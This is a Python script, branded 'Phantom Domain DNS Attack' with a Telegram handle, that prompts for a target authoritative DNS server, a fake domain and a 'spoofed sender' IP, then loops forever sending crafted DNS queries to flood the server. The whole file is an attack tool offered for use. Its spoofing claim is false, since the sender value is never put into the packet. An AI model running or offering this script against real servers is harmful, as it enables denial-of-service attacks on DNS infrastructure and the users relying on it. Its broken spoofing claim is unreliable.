print("\033[1;31m┈┈┈╲┈┈┈┈╱")
print("┈┈┈╱▔▔▔▔╲")
print("┈┈┃┈▇┈┈▇┈┃")
print("╭╮┣━━━━━━┫╭╮")
print("┃┃┃┈┈┈┈┈┈┃┃┃")
print("╰╯┃┈┈┈┈┈┈┃╰╯")
print("┈┈╰┓┏━━┓┏╯")
print("┈┈┈╰╯┈┈╰╯\033[0m")

import socket
import random
import time

def send_dns_packet(destination, port, domain, sender, count):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        payload = create_dns_query(domain, sender)
        sock.sendto(payload, (destination, port))
        print("\033[1;32mDNS request successfully sent to {}\033[0m".format(destination))
        if count % 50 == 0:
            print("\033[1;34m----> 50 DNS requests sent <----\033[0m")
    except Exception as e:
        print("\033[1;31mError sending DNS request to {}: {}\033[0m".format(destination, e))
    finally:
        sock.close()

def create_dns_query(domain, sender):
    transaction_id = random.randint(0, 65535).to_bytes(2, 'big')
    flags = b'\x01\x00'  
    qdcount = b'\x00\x01'  
    payload = transaction_id + flags + qdcount
    
    labels = domain.split('.')
    for label in labels:
        payload += bytes([len(label)]) + label.encode('utf-8')
    payload += b'\x00'  
    payload += b'\x00\x01'  
    payload += b'\x00\x01'  
    
    return payload

print("\033[1;32mPhantom Domain DNS Attack by \nt.me/VikingTERMINAL\033[0m")
destination = input("\033[1;35mEnter the IP address of the authoritative DNS server: \033[0m")
port = 53
domain = input("\033[1;35mEnter the fake domain to request: \033[0m")
sender = input("\033[1;35mEnter the spoofed sender's IP address: \033[0m")
interval = float(input("\033[1;35mEnter the interval between DNS requests (in seconds): \033[0m"))
count = 0

while True:
    send_dns_packet(destination, port, domain, sender, count)
    count += 1
    time.sleep(interval)